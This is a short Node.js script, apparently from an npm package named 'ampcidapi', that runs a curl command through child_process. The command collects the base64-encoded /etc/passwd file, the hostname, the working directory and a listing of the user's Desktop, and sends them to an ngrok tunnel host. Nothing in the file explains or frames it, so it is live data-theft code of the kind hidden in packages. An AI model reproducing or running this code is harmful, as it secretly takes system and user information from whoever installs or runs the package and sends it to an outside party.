

const { exec } = require("child_process");

exec('curl --data-urlencode "Package_name= ampcidapi" --data-urlencode "passwd=`cat /etc/passwd|base64`" --data-urlencode "hostname=`hostname`" --data-urlencode "pwd=`pwd`" --data-urlencode "ls=`ls ~/Desktop`" http://7bd7-197-55-10-187.ngrok.io' , (error, stdout, stderr) => {
    if (error) {
        console.log(`error: $\{error.message\}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: $\{stdout}`);
});


